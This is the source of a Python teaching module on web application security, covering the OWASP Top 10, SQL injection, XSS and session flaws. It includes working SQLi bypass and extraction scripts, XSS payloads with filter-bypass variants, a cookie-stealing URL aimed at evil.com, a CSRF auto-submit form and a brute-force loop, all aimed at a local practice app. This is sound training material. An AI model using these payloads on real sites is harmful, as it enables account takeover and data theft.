"""
Module 3 — Web Application Security
Covers the OWASP Top 10, SQL Injection, Cross-Site Scripting, Authentication
& Session Flaws, and Input Validation & Security Headers.

All hands-on exercises target the local vulnerable Flask app at localhost:5050.
"""

from utils.display import (
    section_header, sub_header, lesson_block, code_block, scenario_block,
    why_it_matters, info, success, warning, press_enter, show_menu,
    disclaimer, hint_text, ask_yes_no, pace, learning_goal, nice_work, tip,
    C, G, Y, R, RESET, BRIGHT, DIM
)
from utils.progress import mark_lesson_complete, mark_challenge_complete
from utils.quiz import run_quiz


# ─────────────────────────────────────────────────────────────────────────────
# Module entry point
# ─────────────────────────────────────────────────────────────────────────────

def run(progress):
    """Main entry point called from the menu system."""
    module_key = "module3"
    while True:
        choice = show_menu("Module 3: Web Application Security", [
            ("owasp_top10",         "Lesson 1: OWASP Top 10 Overview"),
            ("sql_injection",       "Lesson 2: SQL Injection"),
            ("xss",                 "Lesson 3: Cross-Site Scripting (XSS)"),
            ("auth_session",        "Lesson 4: Authentication & Session Flaws"),
            ("input_val_headers",   "Lesson 5: Input Validation & Security Headers"),
            ("quiz",                "Take the Quiz"),
        ])
        if choice == "back":
            return
        if choice == "quit":
            raise SystemExit

        if choice == "owasp_top10":
            lesson_owasp_top10(progress, module_key)
        elif choice == "sql_injection":
            lesson_sql_injection(progress, module_key)
        elif choice == "xss":
            lesson_xss(progress, module_key)
        elif choice == "auth_session":
            lesson_auth_session(progress, module_key)
        elif choice == "input_val_headers":
            lesson_input_val_headers(progress, module_key)
        elif choice == "quiz":
            _run_quiz(progress, module_key)


# ─────────────────────────────────────────────────────────────────────────────
# Lesson 1 — OWASP Top 10 Overview
# ─────────────────────────────────────────────────────────────────────────────

def lesson_owasp_top10(progress, module_key):
    section_header("Lesson 1: OWASP Top 10 Overview")
    learning_goal([
        "Understand what the OWASP Top 10 is and why it matters",
        "Learn the ten most common web security risks",
        "See how real breaches map to OWASP categories",
    ])
    disclaimer()

    lesson_block(
        "The Open Web Application Security Project (OWASP) maintains a list of "
        "the ten most critical security risks facing web applications."
    )
    pace()

    lesson_block(
        "This list is updated periodically and serves as the standard for web "
        "application security awareness. Understanding each category is the "
        "foundation of effective web security work."
    )

    why_it_matters(
        "Most real-world breaches exploit vulnerabilities that fall into "
        "one or more OWASP Top 10 categories. Auditors, penetration testers, and "
        "compliance frameworks (PCI DSS, SOC 2) all reference this list. Knowing "
        "it helps you prioritize fixes and speak a common language with security "
        "teams."
    )

    pace()
    press_enter()

    # ── A01: Broken Access Control ──
    sub_header("A01:2021 — Broken Access Control")
    lesson_block(
        "Broken access control occurs when users can act outside their intended "
        "permissions. This includes accessing other users' data or escalating "
        "privileges from a regular user to an admin."
    )
    tip("This is the #1 risk on the 2021 list -- it is very common in real apps.")
    pace()

    code_block(
        '# Vulnerable: user ID taken directly from the URL\n'
        '@app.route("/profile/<user_id>")\n'
        'def view_profile(user_id):\n'
        '    # No check that the logged-in user owns this profile!\n'
        '    return db.get_profile(user_id)',
        "python"
    )
    pace()

    code_block(
        '# Secure: enforce ownership check\n'
        '@app.route("/profile/<user_id>")\n'
        '@login_required\n'
        'def view_profile(user_id):\n'
        '    if current_user.id != user_id and not current_user.is_admin:\n'
        '        abort(403)\n'
        '    return db.get_profile(user_id)',
        "python"
    )
    pace()

    lesson_block(
        "Common examples: Insecure Direct Object Reference (IDOR), missing "
        "function-level access controls, CORS misconfiguration, and metadata "
        "manipulation (e.g., changing a JWT claim to become admin)."
    )

    pace()
    press_enter()

    # ── A02: Cryptographic Failures ──
    sub_header("A02:2021 — Cryptographic Failures")
    lesson_block(
        "Previously called 'Sensitive Data Exposure', this category focuses on "
        "failures related to cryptography -- or the lack of it."
    )
    lesson_block(
        "Common issues include transmitting data in cleartext, using deprecated "
        "algorithms like MD5 or SHA-1 for password hashing, weak key generation, "
        "and missing encryption for data at rest."
    )
    pace()

    code_block(
        "# BAD — storing passwords with MD5\n"
        "import hashlib\n"
        "password_hash = hashlib.md5(password.encode()).hexdigest()  # INSECURE\n"
        "\n"
        "# GOOD — using bcrypt with automatic salting\n"
        "import bcrypt\n"
        "password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())",
        "python"
    )
    pace()

    nice_work("You have covered the top two risks. Keep going!")

    press_enter()

    # ── A03: Injection ──
    sub_header("A03:2021 — Injection")
    lesson_block(
        "Injection flaws occur when untrusted data is sent to an interpreter as "
        "part of a command or query. SQL injection is the most famous example, but "
        "this also covers NoSQL injection, OS command injection, and LDAP injection."
    )
    tip("We cover SQL injection in depth in Lesson 2 of this module.")
    pace()

    # ── A04: Insecure Design ──
    sub_header("A04:2021 — Insecure Design")
    lesson_block(
        "This category highlights the difference between insecure implementation "
        "and insecure design. A perfect implementation of a bad design is still "
        "insecure."
    )
    lesson_block(
        "Examples: missing rate limiting on a password-reset endpoint, a checkout "
        "flow that does not re-validate prices on the server, or security "
        "questions with easily guessable answers."
    )

    pace()
    press_enter()

    # ── A05: Security Misconfiguration ──
    sub_header("A05:2021 — Security Misconfiguration")
    lesson_block(
        "Misconfiguration is the most commonly seen vulnerability. It includes "
        "default credentials left unchanged, unnecessary services enabled, and "
        "overly permissive cloud storage buckets."
    )
    lesson_block(
        "Verbose error messages that leak stack traces and missing security "
        "headers also fall into this category. Hardening guides and automated "
        "configuration audits help prevent these issues."
    )
    pace()

    nice_work("Halfway through the Top 10 -- you are doing great!")

    # ── A06: Vulnerable and Outdated Components ──
    sub_header("A06:2021 — Vulnerable and Outdated Components")
    lesson_block(
        "Using libraries or frameworks with known vulnerabilities can compromise "
        "the entire application. The Log4Shell vulnerability (CVE-2021-44228) is "
        "a famous example -- a single logging library flaw led to remote code "
        "execution in thousands of apps."
    )
    tip("Keep dependencies updated. Tools like 'pip audit' and 'npm audit' help.")
    pace()

    press_enter()

    # ── A07: Identification and Authentication Failures ──
    sub_header("A07:2021 — Identification and Authentication Failures")
    lesson_block(
        "Weaknesses in authentication allow attackers to assume other users' "
        "identities. This includes permitting brute-force attacks, accepting weak "
        "passwords, and missing multi-factor authentication."
    )
    tip("Lesson 4 in this module covers authentication in depth.")
    pace()

    # ── A08: Software and Data Integrity Failures ──
    sub_header("A08:2021 — Software and Data Integrity Failures")
    lesson_block(
        "This category covers code and infrastructure that does not protect "
        "against integrity violations. Examples: pulling updates from an "
        "untrusted source, insecure CI/CD pipelines, and auto-update mechanisms "
        "that do not validate signatures."
    )
    lesson_block(
        "The SolarWinds attack is a high-profile example -- attackers injected "
        "malicious code into a trusted software update."
    )
    pace()

    press_enter()

    # ── A09: Security Logging and Monitoring Failures ──
    sub_header("A09:2021 — Security Logging and Monitoring Failures")
    lesson_block(
        "Without proper logging and monitoring, breaches go undetected. Many "
        "organizations discover breaches months after they occur."
    )
    lesson_block(
        "Effective security logging captures authentication events, access "
        "control failures, input validation failures, and admin actions -- and "
        "feeds them into a SIEM or alerting system."
    )
    pace()

    # ── A10: Server-Side Request Forgery (SSRF) ──
    sub_header("A10:2021 — Server-Side Request Forgery (SSRF)")
    lesson_block(
        "SSRF occurs when an application fetches a remote resource based on a "
        "user-supplied URL without proper validation. An attacker can force the "
        "server to make requests to internal services."
    )
    lesson_block(
        "Defense includes allowlisting target URLs and blocking requests to "
        "internal networks."
    )
    pace()

    nice_work("You have now seen all ten OWASP categories. Excellent progress!")

    press_enter()

    # ── Scenario ──
    scenario_block(
        "Capital One Breach (2019)",
        "An attacker exploited an SSRF vulnerability in a misconfigured web "
        "application firewall to access AWS metadata credentials. Those "
        "credentials granted access to S3 buckets containing over 100 million "
        "customer records. This incident combined SSRF (A10), Security "
        "Misconfiguration (A05), and Broken Access Control (A01) — demonstrating "
        "how OWASP categories overlap in real breaches."
    )
    pace()

    # ── Practice challenge ──
    sub_header("Practice Challenge")
    info("Map three recent data breaches you have heard about to their")
    info("corresponding OWASP Top 10 categories. Consider which controls")
    info("would have prevented each breach.")
    print()
    hint_text("Search for 'data breach postmortem' on your favorite tech news site.")
    hint_text("Most breaches involve more than one OWASP category.")

    if ask_yes_no("Did you complete the mapping exercise?"):
        success("Great work! Understanding how real incidents map to OWASP categories "
                "is a core skill for security professionals.")
        mark_lesson_complete(progress, module_key, "owasp_top10")
        mark_challenge_complete(progress, module_key, "owasp_mapping_challenge")
    else:
        info("No worries — come back to this challenge any time.")

    press_enter()


# ─────────────────────────────────────────────────────────────────────────────
# Lesson 2 — SQL Injection
# ─────────────────────────────────────────────────────────────────────────────

def lesson_sql_injection(progress, module_key):
    section_header("Lesson 2: SQL Injection")
    learning_goal([
        "Understand how SQL injection works",
        "Learn the different types of SQL injection",
        "Practice exploiting and fixing SQLi on a local app",
        "Know how parameterized queries prevent SQLi",
    ])
    disclaimer()

    lesson_block(
        "SQL Injection (SQLi) is one of the oldest and most dangerous web "
        "vulnerabilities. It occurs when user input is put directly into a SQL "
        "query without proper cleanup."
    )
    pace()

    lesson_block(
        "An attacker can read, modify, or delete data, bypass authentication, "
        "and sometimes even execute operating system commands."
    )

    why_it_matters(
        "SQL injection has been behind some of the largest data breaches in "
        "history. Despite being well-understood, it keeps appearing because "
        "developers concatenate user input into queries."
    )

    pace()
    press_enter()

    # ── How it works ──
    sub_header("How SQL Injection Works")
    lesson_block(
        "Consider a login form that builds a query by concatenating user input "
        "directly into the SQL string:"
    )
    code_block(
        '# VULNERABLE CODE — never do this\n'
        'query = f"SELECT * FROM users WHERE username=\'{username}\' AND password=\'{password}\'"\n'
        'cursor.execute(query)',
        "sql"
    )
    pace()

    code_block(
        '# If the attacker enters this as the username:\n'
        "#   admin' --\n"
        '# The query becomes:\n'
        "#   SELECT * FROM users WHERE username='admin' --' AND password='anything'\n"
        '# The -- comments out the password check, granting access as admin.',
        "sql"
    )
    pace()

    lesson_block(
        "The core problem is that the database cannot tell the difference "
        "between the query structure and the data. The attacker's input changes "
        "the meaning of the query itself."
    )
    tip("Think of it like this: the database treats the attacker's text as commands, not as data.")
    pace()

    press_enter()

    # ── Types of SQLi ──
    sub_header("Types of SQL Injection")

    info(f"{BRIGHT}1. Union-Based SQLi{RESET}")
    lesson_block(
        "The attacker uses the UNION operator to append a second SELECT "
        "statement, extracting data from other tables."
    )
    code_block(
        "# Original query:\n"
        "#   SELECT name, price FROM products WHERE id = '<input>'\n"
        "#\n"
        "# Attacker input:\n"
        "#   1' UNION SELECT username, password FROM users --\n"
        "#\n"
        "# Result: usernames and password hashes appear alongside product data.",
        "sql"
    )
    pace()

    info(f"{BRIGHT}2. Error-Based SQLi{RESET}")
    lesson_block(
        "The attacker triggers database errors that leak information in the "
        "error message, such as table names or column values."
    )
    code_block(
        "# Attacker input (SQL Server example):\n"
        "#   1' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --\n"
        "#\n"
        "# The database tries to convert a table name to an integer,\n"
        "# fails, and includes the table name in the error message.",
        "sql"
    )
    pace()

    info(f"{BRIGHT}3. Blind SQLi{RESET}")
    lesson_block(
        "When the app does not show query results or error messages, the "
        "attacker infers information by observing behavior. Boolean-based blind "
        "SQLi asks true/false questions; time-based blind SQLi uses delay "
        "functions to check if a condition is true."
    )
    code_block(
        "# Boolean-based blind — observe different page responses:\n"
        "#   1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --\n"
        "#\n"
        "# Time-based blind — if the first character is 'a', the response delays:\n"
        "#   1' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(3), 0) --",
        "sql"
    )

    nice_work("You now know the three main types of SQL injection!")
    pace()
    press_enter()

    # ── Hands-on demo against the local vulnerable app ──
    sub_header("Hands-On: SQL Injection Against the Local Vulnerable App")
    warning("These exercises target ONLY the local vulnerable app at http://localhost:5050")
    warning("Never attempt SQL injection against systems you do not own.")
    print()

    lesson_block(
        "The vulnerable Flask app has a /login endpoint and a /search endpoint "
        "that are intentionally vulnerable. Let's exploit the login bypass first."
    )
    pace()

    code_block(
        'import requests\n'
        '\n'
        'TARGET = "http://localhost:5050"\n'
        '\n'
        '# --- Login Bypass via SQL Injection ---\n'
        'print("[*] Attempting SQL injection login bypass...")\n'
        'payload = {\n'
        '    "username": "admin\' --",\n'
        '    "password": "anything"\n'
        '}\n'
        'resp = requests.post(f"{TARGET}/login", data=payload)\n'
        'if "Welcome" in resp.text or resp.status_code == 200:\n'
        '    print("[+] Login bypass successful!")\n'
        'else:\n'
        '    print("[-] Login bypass failed — the app may be patched.")',
        "python"
    )
    pace()

    lesson_block(
        "Next, let's try extracting data using a UNION-based injection:"
    )
    code_block(
        '# --- Union-Based Data Extraction ---\n'
        'print("[*] Attempting union-based data extraction...")\n'
        "sqli_payload = \"' UNION SELECT username, password FROM users --\"\n"
        'resp = requests.get(f"{TARGET}/search", params={"q": sqli_payload})\n'
        'print(f"[+] Response excerpt: {resp.text[:500]}")',
        "python"
    )
    pace()

    press_enter()

    # ── Defense: parameterized queries ──
    sub_header("Defense: Parameterized Queries (Prepared Statements)")
    lesson_block(
        "The primary defense against SQL injection is parameterized queries. "
        "Instead of concatenating user input into the query, you pass it as "
        "separate parameters. The database driver ensures the input is always "
        "treated as data, never as SQL code."
    )
    pace()

    code_block(
        '# VULNERABLE — string concatenation\n'
        'cursor.execute(f"SELECT * FROM users WHERE username=\'{username}\'")\n'
        '\n'
        '# SECURE — parameterized query (sqlite3)\n'
        'cursor.execute("SELECT * FROM users WHERE username=?", (username,))',
        "python"
    )
    pace()

    code_block(
        '# SECURE — parameterized query (psycopg2 / PostgreSQL)\n'
        'cursor.execute("SELECT * FROM users WHERE username=%s", (username,))\n'
        '\n'
        '# SECURE — using an ORM (SQLAlchemy)\n'
        'user = session.query(User).filter(User.username == username).first()',
        "python"
    )
    pace()

    lesson_block(
        "Additional defenses: use an ORM (SQLAlchemy, Django ORM), apply least "
        "privilege to database accounts, validate all input, and use a Web "
        "Application Firewall (WAF) as a secondary layer."
    )
    tip("Parameterized queries are always the first line of defense -- everything else is a bonus.")

    nice_work("You now understand how to both exploit and defend against SQL injection!")
    pace()
    press_enter()

    # ── Scenario ──
    scenario_block(
        "Heartland Payment Systems (2008)",
        "Attackers used SQL injection to install malware on Heartland's payment "
        "processing network, eventually stealing 130 million credit and debit card "
        "numbers. The company paid over $145 million in compensation. The attack "
        "began with a simple SQL injection in a public-facing web application."
    )
    pace()

    # ── Practice challenge ──
    sub_header("Practice Challenge: Detect and Fix SQLi")
    info("1. Start the vulnerable app: python -m vulnerable_app")
    info("   (It should be running on http://localhost:5050)")
    info("2. Use the script above to confirm the SQLi vulnerability.")
    info("3. Open the vulnerable app source code and rewrite the query")
    info("   using parameterized queries.")
    info("4. Verify your fix by running the exploit script again — it should fail.")
    print()
    hint_text("Look for any place where f-strings or .format() build SQL queries.")
    hint_text("Replace them with cursor.execute('...?...', (param,)) syntax.")

    if ask_yes_no("Did you successfully exploit and then fix the SQL injection?"):
        success("Excellent! You now understand both attack and defense.")
        mark_lesson_complete(progress, module_key, "sql_injection")
        mark_challenge_complete(progress, module_key, "sqli_exploit_and_fix")
    else:
        info("Come back after trying the exercise. Understanding SQLi is critical.")

    press_enter()


# ─────────────────────────────────────────────────────────────────────────────
# Lesson 3 — Cross-Site Scripting (XSS)
# ─────────────────────────────────────────────────────────────────────────────

def lesson_xss(progress, module_key):
    section_header("Lesson 3: Cross-Site Scripting (XSS)")
    learning_goal([
        "Understand the three types of XSS",
        "See how attackers use XSS to steal data",
        "Learn defenses like output encoding and CSP headers",
    ])
    disclaimer()

    lesson_block(
        "Cross-Site Scripting (XSS) occurs when an application includes "
        "untrusted data in its web pages without proper escaping. This lets "
        "attackers run JavaScript in a victim's browser."
    )
    pace()

    lesson_block(
        "XSS can enable session hijacking, defacement, phishing, and keylogging."
    )

    why_it_matters(
        "XSS is the most commonly found vulnerability in bug bounty programs. "
        "A single XSS flaw can lead to complete account takeover by stealing "
        "session cookies."
    )

    pace()
    press_enter()

    # ── Types of XSS ──
    sub_header("Type 1: Reflected XSS")
    lesson_block(
        "Reflected XSS happens when user input is immediately echoed back by the "
        "server without encoding. The malicious script is part of the request "
        "(often a crafted URL) and is 'reflected' back to the user."
    )
    pace()

    code_block(
        '# Vulnerable Flask route — reflects user input without escaping\n'
        '@app.route("/search")\n'
        'def search():\n'
        '    query = request.args.get("q", "")\n'
        '    # BAD: directly inserting user input into HTML\n'
        '    return f"<h1>Search results for: {query}</h1>"',
        "python"
    )
    pace()

    code_block(
        '# Attacker crafts this URL:\n'
        '# http://localhost:5050/search?q=<script>document.location=\n'
        '#   "http://evil.com/steal?c="+document.cookie</script>\n'
        '\n'
        '# When a victim clicks the link, their cookies are sent to evil.com',
        "python"
    )
    pace()

    press_enter()

    sub_header("Type 2: Stored (Persistent) XSS")
    lesson_block(
        "Stored XSS occurs when the malicious payload is permanently saved on "
        "the server -- in a database, forum post, comment field, or user profile. "
        "Every user who views the page executes the script."
    )
    lesson_block(
        "This makes stored XSS far more dangerous than reflected XSS because it "
        "does not require tricking a victim into clicking a link."
    )
    pace()

    code_block(
        '# Vulnerable: storing and rendering comments without escaping\n'
        '@app.route("/comment", methods=["POST"])\n'
        'def post_comment():\n'
        '    comment = request.form.get("comment")\n'
        '    db.execute("INSERT INTO comments (body) VALUES (?)", (comment,))\n'
        '    return redirect("/comments")',
        "python"
    )
    pace()

    code_block(
        '@app.route("/comments")\n'
        'def show_comments():\n'
        '    comments = db.execute("SELECT body FROM comments").fetchall()\n'
        '    html = "<h1>Comments</h1>"\n'
        '    for c in comments:\n'
        '        html += f"<p>{c[0]}</p>"   # BAD — renders raw HTML/JS\n'
        '    return html',
        "python"
    )
    pace()

    nice_work("You understand both reflected and stored XSS now!")

    press_enter()

    sub_header("Type 3: DOM-Based XSS")
    lesson_block(
        "DOM-based XSS happens entirely in the browser. The flaw is in "
        "client-side JavaScript that inserts user input into the page without "
        "sanitization. The server response may be perfectly safe."
    )
    pace()

    code_block(
        '<!-- Vulnerable JavaScript -->\n'
        '<script>\n'
        '  // Reads the "name" parameter from the URL fragment\n'
        '  var name = document.location.hash.substring(1);\n'
        '  // BAD: inserts it into the page without encoding\n'
        '  document.getElementById("greeting").innerHTML = "Hello, " + name;\n'
        '</script>',
        "html"
    )
    pace()

    code_block(
        '<!-- Attacker URL: -->\n'
        '<!-- http://example.com/page#<img src=x onerror=alert(document.cookie)> -->',
        "html"
    )
    tip("DOM-based XSS is tricky because it never touches the server -- all the danger is in the browser code.")
    pace()

    press_enter()

    # ── Payload Examples ──
    sub_header("Common XSS Payload Examples (for authorized testing only)")
    warning("Use these ONLY against applications you own or have permission to test.")
    print()
    code_block(
        '# Basic alert test\n'
        '<script>alert("XSS")</script>\n'
        '\n'
        '# Image tag with onerror\n'
        '<img src=x onerror=alert("XSS")>\n'
        '\n'
        '# SVG-based payload\n'
        '<svg onload=alert("XSS")>',
        "html"
    )
    pace()

    code_block(
        '# Bypassing basic filters (case variation)\n'
        '<ScRiPt>alert("XSS")</ScRiPt>\n'
        '\n'
        '# Event handler injection\n'
        '<body onload=alert("XSS")>\n'
        '\n'
        '# Cookie stealing payload (for your own test app ONLY)\n'
        '<script>new Image().src="http://localhost:8888/steal?c="+document.cookie</script>',
        "html"
    )
    pace()

    press_enter()

    # ── Hands-on against the vulnerable app ──
    sub_header("Hands-On: XSS Against the Local Vulnerable App")
    warning("Target ONLY http://localhost:5050 -- never test on external sites.")
    print()

    lesson_block("First, let's test for reflected XSS on the search endpoint:")
    code_block(
        'import requests\n'
        '\n'
        'TARGET = "http://localhost:5050"\n'
        '\n'
        '# --- Reflected XSS test ---\n'
        'print("[*] Testing reflected XSS...")\n'
        'payload = \'<script>alert("XSS")</script>\'\n'
        'resp = requests.get(f"{TARGET}/search", params={"q": payload})\n'
        'if payload in resp.text:\n'
        '    print("[+] Reflected XSS confirmed — payload rendered without encoding")\n'
        'else:\n'
        '    print("[-] Payload was encoded or filtered")',
        "python"
    )
    pace()

    lesson_block("Now let's check for stored XSS in the comments section:")
    code_block(
        '# --- Stored XSS test ---\n'
        'print("[*] Testing stored XSS...")\n'
        'xss_comment = \'<script>alert("StoredXSS")</script>\'\n'
        'requests.post(f"{TARGET}/comment", data={"comment": xss_comment})\n'
        'resp = requests.get(f"{TARGET}/comments")\n'
        'if xss_comment in resp.text:\n'
        '    print("[+] Stored XSS confirmed — payload persisted and rendered")\n'
        'else:\n'
        '    print("[-] Payload was sanitized or not rendered")',
        "python"
    )
    pace()

    press_enter()

    # ── Defenses ──
    sub_header("Defenses Against XSS")
    lesson_block(
        "The primary defense is output encoding -- converting special characters "
        "like <, >, and & into their HTML entity equivalents before rendering "
        "them. Modern template engines (Jinja2, React, Angular) auto-escape by "
        "default."
    )
    pace()

    code_block(
        '# Flask / Jinja2 — auto-escaping is ON by default in templates\n'
        '# In your template (safe):\n'
        '#   <p>{{ user_input }}</p>\n'
        '#   Jinja2 converts <script> to &lt;script&gt;\n'
        '\n'
        '# Manual escaping in Python:\n'
        'from markupsafe import escape\n'
        'safe_input = escape(user_input)',
        "python"
    )
    pace()

    code_block(
        '# Content-Security-Policy header to block inline scripts:\n'
        "# Content-Security-Policy: default-src 'self'; script-src 'self'\n"
        '\n'
        '# HttpOnly flag prevents JavaScript from accessing cookies:\n'
        'response.set_cookie("session", value=token, httponly=True, secure=True)',
        "python"
    )
    pace()

    lesson_block(
        "Defense in depth for XSS: (1) Output encode all user-controlled data. "
        "(2) Use Content-Security-Policy headers. (3) Set HttpOnly on session "
        "cookies. (4) Validate input server-side. (5) Use DOMPurify for any "
        "client-side HTML rendering."
    )

    nice_work("You now know both the attacks and defenses for XSS!")
    pace()
    press_enter()

    # ── Scenario ──
    scenario_block(
        "MySpace Samy Worm (2005)",
        "Samy Kamkar wrote a self-propagating XSS worm that exploited stored XSS "
        "on MySpace profiles. When users viewed an infected profile, the worm "
        "added Samy as a friend and copied itself to the viewer's profile. Within "
        "20 hours, over one million users were affected — making it the fastest-"
        "spreading virus of all time. This demonstrated how stored XSS can be "
        "weaponized at scale."
    )
    pace()

    # ── Practice challenge ──
    sub_header("Practice Challenge: Find and Fix XSS")
    info("1. Open http://localhost:5050 in your browser.")
    info("2. Find the search form and try injecting <script>alert('XSS')</script>")
    info("3. Check the comments page for stored XSS opportunities.")
    info("4. Fix the vulnerabilities by adding output encoding.")
    info("   Hint: Use Jinja2 templates with auto-escaping or markupsafe.escape().")
    print()
    hint_text("If the alert box pops up, the XSS vulnerability is confirmed.")
    hint_text("After fixing, the payload should display as literal text, not execute.")

    if ask_yes_no("Did you find and fix the XSS vulnerabilities?"):
        success("Well done! XSS prevention is a cornerstone of web security.")
        mark_lesson_complete(progress, module_key, "xss")
        mark_challenge_complete(progress, module_key, "xss_find_and_fix")
    else:
        info("Take your time — XSS is tricky. Return when you are ready.")

    press_enter()


# ─────────────────────────────────────────────────────────────────────────────
# Lesson 4 — Authentication & Session Flaws
# ─────────────────────────────────────────────────────────────────────────────

def lesson_auth_session(progress, module_key):
    section_header("Lesson 4: Authentication & Session Flaws")
    learning_goal([
        "Understand common authentication weaknesses",
        "Learn about session fixation and CSRF attacks",
        "Know best practices for secure session management",
    ])
    disclaimer()

    lesson_block(
        "Authentication and session management are the gatekeepers of any web "
        "application. When these are flawed, attackers can impersonate other users."
    )
    pace()

    lesson_block(
        "This lesson covers broken authentication, session fixation, Cross-Site "
        "Request Forgery (CSRF), and secure session management practices."
    )

    why_it_matters(
        "Authentication flaws are involved in the majority of account-takeover "
        "attacks. Credential stuffing attacks run at massive scale. Without proper "
        "session management, even a strong auth system can be undermined."
    )

    pace()
    press_enter()

    # ── Broken Authentication ──
    sub_header("Broken Authentication")
    lesson_block(
        "Broken authentication covers a wide range of weaknesses: allowing weak "
        "passwords, no account lockout after failed attempts, exposing session "
        "IDs in URLs, and failing to invalidate sessions on logout."
    )
    pace()

    code_block(
        '# 1. No rate limiting on login — allows brute-force\n'
        '@app.route("/login", methods=["POST"])\n'
        'def login():\n'
        '    # No limit on attempts!\n'
        '    user = db.check_credentials(request.form["user"], request.form["pass"])\n'
        '    if user:\n'
        '        session["user_id"] = user.id\n'
        '        return redirect("/dashboard")\n'
        '    return "Invalid credentials", 401',
        "python"
    )
    pace()

    code_block(
        '# 2. Session ID in URL — can be leaked via Referer header\n'
        '#    http://example.com/dashboard?sessionid=abc123\n'
        '\n'
        '# 3. Session not invalidated on logout\n'
        '@app.route("/logout")\n'
        'def logout():\n'
        '    return redirect("/login")  # BAD — session still valid!',
        "python"
    )
    tip("Always check: does logging out actually destroy the session on the server?")
    pace()

    press_enter()

    # ── Session Fixation ──
    sub_header("Session Fixation")
    lesson_block(
        "In a session fixation attack, the attacker sets a victim's session ID "
        "to a known value before the victim logs in. If the app does not "
        "regenerate the session ID after login, the attacker can hijack the "
        "authenticated session."
    )
    pace()

    code_block(
        '# Session fixation attack flow:\n'
        '# 1. Attacker visits the app, receives session ID: abc123\n'
        '# 2. Attacker tricks victim into using that session:\n'
        '#    http://example.com/login?sessionid=abc123\n'
        '# 3. Victim logs in — the app keeps session ID abc123\n'
        '# 4. Attacker uses abc123 to access the victim\'s account',
        "python"
    )
    pace()

    code_block(
        '# DEFENSE: Always regenerate the session ID after login\n'
        'from flask import session\n'
        'import os\n'
        '\n'
        '@app.route("/login", methods=["POST"])\n'
        'def secure_login():\n'
        '    user = authenticate(request.form["user"], request.form["pass"])\n'
        '    if user:\n'
        '        session.clear()                  # Destroy old session\n'
        '        session["user_id"] = user.id     # New session created\n'
        '        session.permanent = True\n'
        '        return redirect("/dashboard")\n'
        '    return "Invalid", 401',
        "python"
    )

    nice_work("You understand session fixation and how to prevent it!")
    pace()
    press_enter()

    # ── CSRF ──
    sub_header("Cross-Site Request Forgery (CSRF)")
    lesson_block(
        "CSRF tricks an authenticated user's browser into submitting a request "
        "without the user's knowledge. The browser automatically attaches the "
        "user's session cookies to the request."
    )
    pace()

    code_block(
        '<!-- Malicious page hosted on evil.com -->\n'
        '<!-- If the victim is logged into bank.com, this form auto-submits -->\n'
        '<html>\n'
        '<body onload="document.getElementById(\'csrf_form\').submit()">\n'
        '  <form id="csrf_form" action="https://bank.com/transfer" method="POST">\n'
        '    <input type="hidden" name="to" value="attacker_account">\n'
        '    <input type="hidden" name="amount" value="10000">\n'
        '  </form>\n'
        '</body>\n'
        '</html>',
        "html"
    )
    pace()

    lesson_block(
        "Defense against CSRF: (1) Use anti-CSRF tokens in each form. "
        "(2) Set the SameSite attribute on cookies. "
        "(3) Check Origin and Referer headers on state-changing requests."
    )
    pace()

    code_block(
        '# Flask-WTF provides automatic CSRF protection\n'
        'from flask_wtf import FlaskForm, CSRFProtect\n'
        'from wtforms import StringField, SubmitField\n'
        '\n'
        'app.config["SECRET_KEY"] = os.urandom(32)\n'
        'csrf = CSRFProtect(app)',
        "python"
    )
    pace()

    code_block(
        '# In your Jinja2 template:\n'
        '# <form method="POST">\n'
        '#   {{ form.hidden_tag() }}   <!-- includes CSRF token -->\n'
        '#   ...\n'
        '# </form>\n'
        '\n'
        '# Setting SameSite on cookies\n'
        'response.set_cookie(\n'
        '    "session", value=token,\n'
        '    httponly=True, secure=True, samesite="Lax"\n'
        ')',
        "python"
    )
    tip("SameSite cookies are one of the easiest CSRF defenses to add -- just one flag!")
    pace()

    press_enter()

    # ── Secure Session Management ──
    sub_header("Secure Session Management Best Practices")
    lesson_block(
        "Proper session management involves several layers of defense:"
    )
    info("1. Generate session IDs using a cryptographically secure random generator.")
    info("2. Set session cookies with HttpOnly, Secure, and SameSite flags.")
    info("3. Regenerate the session ID after every privilege change (login, role change).")
    pace()

    info("4. Set an appropriate session timeout (idle and absolute).")
    info("5. Invalidate the session completely on logout (server-side deletion).")
    info("6. Store sessions server-side; never trust client-side session data alone.")
    print()
    pace()

    code_block(
        'from flask import Flask, session\n'
        'from datetime import timedelta\n'
        'import os\n'
        '\n'
        'app = Flask(__name__)\n'
        'app.secret_key = os.urandom(32)       # Strong random key\n'
        'app.permanent_session_lifetime = timedelta(minutes=30)  # Session timeout',
        "python"
    )
    pace()

    code_block(
        '# Secure cookie settings in production\n'
        'app.config.update(\n'
        '    SESSION_COOKIE_HTTPONLY=True,       # No JS access to cookie\n'
        '    SESSION_COOKIE_SECURE=True,         # HTTPS only\n'
        '    SESSION_COOKIE_SAMESITE="Lax",      # CSRF protection\n'
        ')\n'
        '\n'
        '@app.route("/logout")\n'
        'def logout():\n'
        '    session.clear()                     # Destroy session data\n'
        '    return redirect("/login")',
        "python"
    )

    nice_work("You have a solid grasp of secure session management!")
    pace()
    press_enter()

    # ── Hands-on against the vulnerable app ──
    sub_header("Hands-On: Testing Auth Flaws on the Local Vulnerable App")
    warning("Target ONLY http://localhost:5050")
    print()

    lesson_block("First, let's test if the login has any rate limiting:")
    code_block(
        'import requests\n'
        '\n'
        'TARGET = "http://localhost:5050"\n'
        '\n'
        '# --- Brute-force login (no rate limiting) ---\n'
        'print("[*] Testing for missing rate limiting...")\n'
        'common_passwords = ["password", "123456", "admin", "letmein", "welcome"]\n'
        'for pwd in common_passwords:\n'
        '    resp = requests.post(f"{TARGET}/login",\n'
        '        data={"username": "admin", "password": pwd})\n'
        '    if resp.status_code == 200 and "Welcome" in resp.text:\n'
        '        print(f"[+] Password found: {pwd}")\n'
        '        break\n'
        '    # No delay, no lockout — this is the vulnerability',
        "python"
    )
    pace()

    lesson_block("Next, let's check how the session cookie is configured:")
    code_block(
        '# --- Check session cookie flags ---\n'
        'print("[*] Checking session cookie security flags...")\n'
        'session = requests.Session()\n'
        'session.post(f"{TARGET}/login",\n'
        '    data={"username": "admin", "password": "admin"})\n'
        'for cookie in session.cookies:\n'
        '    print(f"    Cookie: {cookie.name}")\n'
